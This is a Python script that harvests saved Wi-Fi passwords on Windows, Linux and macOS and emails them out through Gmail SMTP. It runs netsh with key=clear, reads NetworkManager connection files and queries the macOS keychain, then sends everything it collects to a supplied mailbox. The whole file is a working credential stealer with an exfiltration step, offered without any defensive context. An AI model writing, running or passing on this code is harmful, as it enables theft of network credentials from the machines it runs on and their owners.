#!/usr/bin/env python3
"""currently supports Windows 10 only"""
import subprocess
import smtplib
import re
import platform


def send_email(my_email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(my_email, password)
    # send from my_email to my_email (from, to, message)
    server.sendmail(my_email, my_email, message)
    server.quit()


def linux():
    command = "cat /etc/NetworkManager/system-connections/*"
    networks = subprocess.check_output(command, shell=True).decode("utf-8")
    return networks


def windows10():
    command = "netsh wlan show profile"
    # requires .decode("utf-8") if using python3
    networks = subprocess.check_output(command, shell=True).decode("utf-8")

    # find all network profiles and display it as a list
    network_names = re.findall("(?:Profile\s*:\s)(.*)", networks)

    result = ""
    for profile_name in network_names:
        command = "netsh wlan show profile " + profile_name + " key=clear"
        # requires .decode("utf-8") if using python3
        current_result = subprocess.check_output(command,
                                                 shell=True).decode("utf-8")
        result += current_result
    return result


# TODO: enable all profile_name results to be displayed, remove keychain prompt
def osx():
    """
    Requires the input of keychain username and password to work
    only the last profile_name result can be sent & displayed in email
    """
    command = "defaults read /Library/Preferences/SystemConfiguration/"\
        "com.apple.airport.preferences KnownNetworks | grep SSIDString"
    networks = subprocess.check_output(command, shell=True).decode("utf-8")
    network_names = re.findall("(?:SSIDString....)(.*)(?:..)", networks)
    result = ""
    for profile_name in network_names:
        command = "security find-generic-password -wa " + profile_name
        current_result = subprocess.check_output(command,
                                                 shell=True).decode("utf-8")
        output = "Network name: " + profile_name + " password: " +\
            current_result + "\n"
        result += output
    return result


def main(my_email, password):
    os = platform.system()
    if os == "Linux":
        result = linux()
    elif os == "Darwin":
        result = osx()
    elif os == "Windows":
        result = windows10()
    else:
        pass
    send_email(my_email, password, result)


if __name__ == "__main__":
    main(my_email, password)
